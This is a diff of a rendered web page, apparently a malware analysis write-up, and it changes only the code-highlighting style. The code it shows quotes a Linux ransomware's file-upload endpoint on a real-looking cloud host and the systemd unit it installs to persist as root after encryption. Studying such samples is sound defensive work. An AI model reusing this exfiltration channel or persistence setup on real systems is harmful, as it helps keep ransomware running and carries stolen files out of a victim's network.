-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">PUT https://plankton-app-3qigq.ondigitalocean.app/upload/&lt;client_id&gt;
-</span></span><span class="line"><span class="ln">2</span><span class="cl">X-Filename: &lt;filename&gt;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>PUT https://plankton-app-3qigq.ondigitalocean.app/upload/&lt;client_id&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>X-Filename: &lt;filename&gt;</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1401,17 +1401,17 @@
     
 </h4>
 <p>After encryption completes, the malware installs itself as a systemd service to survive reboots. It copies the binary to <code>/usr/bin/ubuntu-run</code>, writes the following unit file to <code>/etc/systemd/system/ubuntu_running.service</code>, then runs <code>systemctl daemon-reload &amp;&amp; systemctl enable ubuntu_running.service &amp;&amp; systemctl start ubuntu_running.service</code>.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">[Unit]</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="na">Description</span><span class="o">=</span><span class="s">Ubuntu Running</span>
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="na">After</span><span class="o">=</span><span class="s">network.target</span>
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">[Service]</span>
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="na">ExecStart</span><span class="o">=</span><span class="s">/usr/bin/ubuntu-run xGonnaGiveIt2Ya</span>
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="na">Restart</span><span class="o">=</span><span class="s">always</span>
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="na">User</span><span class="o">=</span><span class="s">root</span>
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
-</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">[Install]</span>
-</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="na">WantedBy</span><span class="o">=</span><span class="s">multi-user.target</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">[Unit]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#a6e22e">Description</span><span style="color:#f92672">=</span><span style="color:#e6db74">Ubuntu Running</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#a6e22e">After</span><span style="color:#f92672">=</span><span style="color:#e6db74">network.target</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#66d9ef">[Service]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#a6e22e">ExecStart</span><span style="color:#f92672">=</span><span style="color:#e6db74">/usr/bin/ubuntu-run xGonnaGiveIt2Ya</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#a6e22e">Restart</span><span style="color:#f92672">=</span><span style="color:#e6db74">always</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#a6e22e">User</span><span style="color:#f92672">=</span><span style="color:#e6db74">root</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#66d9ef">[Install]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#a6e22e">WantedBy</span><span style="color:#f92672">=</span><span style="color:#e6db74">multi-user.target</span></span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
